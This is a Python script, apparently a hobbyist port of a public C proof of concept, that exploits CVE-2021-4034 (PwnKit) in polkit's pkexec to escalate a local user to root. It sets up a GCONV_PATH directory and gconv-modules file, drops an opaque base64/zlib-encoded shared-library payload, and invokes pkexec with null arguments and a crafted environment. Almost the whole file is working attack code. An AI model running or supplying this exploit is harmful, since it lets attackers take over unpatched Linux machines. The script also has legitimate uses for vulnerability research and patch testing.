#!/usr/bin/env python3

# CVE-2021-4034 in Python
#
# Joe Ammond (joe@ammond.org)
#
# This was just an experiment to see whether I could get this to work
# in Python, and to play around with ctypes

# This was completely cribbed from blasty's original C code:
# https://haxx.in/files/blasty-vs-pkexec.c

import base64
import os
import sys

from ctypes import *
from ctypes.util import find_library

def create_libx(so_path):
    if os.path.isfile(so_path):
        return  # existed
    
    import zlib
    import base64

    libx_b64 = 'eNqrd/VxY2JkZIABZgY7BhBPACrkwIAJHBgsGJigbJAydgbcwJARlWYQgFBMUH0boMLodAIazQGl\neWDGQM1jRbOPDY3PhcbnZsAPsjIjDP/zs2ZlRfCzGn7z2KGflJmnX5zBEBASn2UdMZOfFQDLghD3'
    libx_b64 = 'eJyrd/VxY2JkZIABZgY7BhBPACrkwIAJHBgsGJigbJAydixqYMCQEZVmEIBQTFB9G6DC6HQCGs0BpXlgxkDNY0Wzjw2Nz4XG58bjVhDIyoww/M/PmpUVwc9q+M1jh35SZp5+cSlDQEh8lnXETH5WAMwREQQ='
    libx_b64 = 'eJztmr9Lw0AUx9+lta0/oC6Ci9hBwSkaXAqCCFbJ4KAO4mSJbTQG22ASh7q4iW6O/gn+Cf4Z4uqsTo46NibNe3qNjaXoIrwPtN+8u/vevfux3Z2vbawrQgCRgWXoRKU4XsHyy9Jnk7CsDLnwfxgKnbZZ+IHx3hr5cuFvYTqOk3oP3Sr78lJ+Sa1At5JPGXC8AurWk1/Pp0ytFzTN7dCXHWA8IWlGihVJBXytW/ihRF8C6xb3H19PLm7O0vJSOrnlv9ZLGq9XOVSrnm+4/g9TZRiGYRiGYRiGYRiGYRiGYRiGYRiG+deM0UcpFrr7vsYL27d24ER6i/EQ1k/iRW4O43usH8F4GHWU2v9Rvv3QAvtotzgUih2KfieQTf1OrVmO6vpC17Iz+tWLLdpjM9r7jl3Y08Xzjn71rD3YS6EJQPUsz3d9Yx/Uw+apahmeBWq91fRajVh9F1TTqh64RsPslBiNo1pkM4+Pa07d/P08ihCvNd2X036Q0npmUOl+n/YvWvf3IHDIT/tHOpfiJyawD/LT/pLq0nhC8lNeU9g3+em8kNL5IEQinsUy8n97d5Egmf88xGeT5pf2XoHWi/zUfRmktxkRpW79fI+Rkj+9e0hSQf9qH/8H3KdXEg=='
    with open(so_path, 'wb') as f:
        f.write(zlib.decompress(base64.b64decode(libx_b64)))
    os.chmod(so_path, 0o755)

# Set the environment for the call to execve()
environ = [
        b'pwnkit',
        b'PATH=GCONV_PATH=.',
        b'CHARSET=PWNKIT',
        b'LC_MESSAGES=en_US.UTF-8',
        b'XAUTHORITY=../un',
        b'GIO_USE_VFS=',
        None
]

# Find the C library to call execve() directly, as Python helpfully doesn't
# allow us to call execve() with no arguments.
try:
    libc = CDLL(find_library('c'))
except:
    print('[!] Unable to find the C library, wtf?')
    sys.exit()

# os.system("rm -rf 'GCONV_PATH=.'; mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'")
# os.system("rm -rf 'pwnkit'; mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 1' > pwnkit/gconv-modules")


# make the GCONV_PATH directory
try:
    os.mkdir('GCONV_PATH=.')
except FileExistsError:
    print('[-] GCONV_PATH=. directory already exists, continuing.')
except:
    print('[!] Failed making GCONV_PATH=. directory.')
    sys.exit()

# Create a temp exploit file
try:
    with open('GCONV_PATH=./pwnkit', 'wb') as f:
        f.write(b'')
except:
    print('[!] Failed creating exploit file')
    sys.exit()
os.chmod('GCONV_PATH=./pwnkit', 0o0755)

# Create directory to hold gconf-modules configuration file
try:
    os.mkdir('pwnkit')
except FileExistsError:
    print('[-] pwnkit directory already exists, continuing.')
except:
    print('[!] Failed making exploit directory.')
    sys.exit()

# Create gconf config file
try:
    with open('pwnkit/gconv-modules', 'wb') as f:
        f.write(b'module UTF-8// PWNKIT// pwnkit 1\n');
except:
    print('[!] Failed to create gconf-modules config file.')
    sys.exit()


# Create the shared library from the payload
print('[+] Creating shared library for exploit code.')
try:
    create_libx('./pwnkit/pwnkit.so')
except:
    print('[!] Failed creating payload.so.')
    sys.exit()


# Convert the environment to an array of char*
environ_p = (c_char_p * len(environ))()
environ_p[:] = environ

args = [None]
args_p = (c_char_p * len(args))()
args_p[:] = args

print('[+] Calling execve()')
# Call execve() with NULL arguments
libc.execve(b'/usr/bin/pkexec', c_char_p(), environ_p)
